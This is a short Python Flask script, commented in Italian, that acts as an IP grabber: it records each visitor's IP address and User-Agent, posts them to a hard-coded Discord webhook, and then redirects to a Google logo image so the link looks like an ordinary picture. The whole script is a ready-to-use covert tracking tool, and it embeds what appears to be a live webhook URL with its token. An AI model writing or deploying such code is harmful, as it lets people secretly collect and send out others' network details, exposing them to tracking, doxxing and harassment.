from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# CONFIGURAZIONE
WEBHOOK_URL = "https://discord.com/api/webhooks/1472623600799453337/FoETjKnj5OoXRzudvs9POWMEOQbVNicWdnomryDZEyfVq6-RbyykJgHwkbdP4KEh4uaS" # <--- Incolla qui il tuo Webhook di Discord
IMAGE_URL = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" # <--- L'immagine che vedrà l'utente

@app.route('/')
@app.route('/<path:path>')
def index(path=None):
    # Raccoglie le info dell'utente
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    # Prepara il messaggio per Discord
    data = {
        "embeds": [{
            "title": "IP Logged!",
            "color": 16711680,
            "fields": [
                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "User Agent", "value": f"`{user_agent}`", "inline": False}
            ]
        }]
    }
    
    # Invia i dati al Webhook
    requests.post(WEBHOOK_URL, json=data)
    
    # Reindirizza all'immagine reale
    return redirect(IMAGE_URL)

if __name__ == "__main__":
    app.run()
